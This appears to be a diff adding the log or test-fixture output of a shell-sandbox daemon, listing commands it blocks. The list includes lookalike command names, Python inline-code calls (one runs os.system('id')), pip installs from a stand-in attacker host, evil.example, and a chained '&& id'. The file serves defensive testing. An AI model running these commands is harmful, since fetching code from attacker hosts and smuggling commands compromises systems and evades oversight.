@@ -1,0 +1,27 @@
+⚠  Daemon: blocked shell command: lsof
+⚠  Daemon: blocked shell command: lsblk
+⚠  Daemon: blocked shell command: lsattr x
+⚠  Daemon: blocked shell command: catdoc x
+⚠  Daemon: blocked shell command: envsubst
+⚠  Daemon: blocked shell command: echo2 x
+⚠  Daemon: blocked shell command: grepjar
+⚠  Daemon: blocked shell command: findmnt
+⚠  Daemon: blocked shell command: pytestx
+⚠  Daemon: blocked shell command: whichever
+⚠  Daemon: blocked shell command: pwdx 1
+⚠  Daemon: blocked shell command: printenvx
+⚠  Daemon: blocked inline-code/bundled flag in: python3 -Ic 'import 
+os;os.system("id")'
+⚠  Daemon: blocked inline-code/bundled flag in: python3 -Bc 'print(1)'
+⚠  Daemon: blocked inline-code/bundled flag in: python3 -Im http.server
+⚠  Daemon: blocked inline-code/bundled flag in: pip install 
+git+https://evil.example/x.git
+⚠  Daemon: blocked inline-code/bundled flag in: pip install --index-url 
+http://evil.example/simple x
+⚠  Daemon: blocked inline-code/bundled flag in: python3 -Ec 1
+⚠  Daemon: blocked inline-code/bundled flag in: python3 -Wc 1
+⚠  Daemon: blocked inline-code/bundled flag in: python3 -Sc 1
+⚠  Daemon: blocked inline-code/bundled flag in: pip3 install -fx pkg
+⚠  Daemon: blocked inline-code/bundled flag in: pip install x && id
+⚠  Daemon: blocked dangerous flag '-c' in: python3 -I -c 1
+⚠  Daemon: blocked shell command: cdx
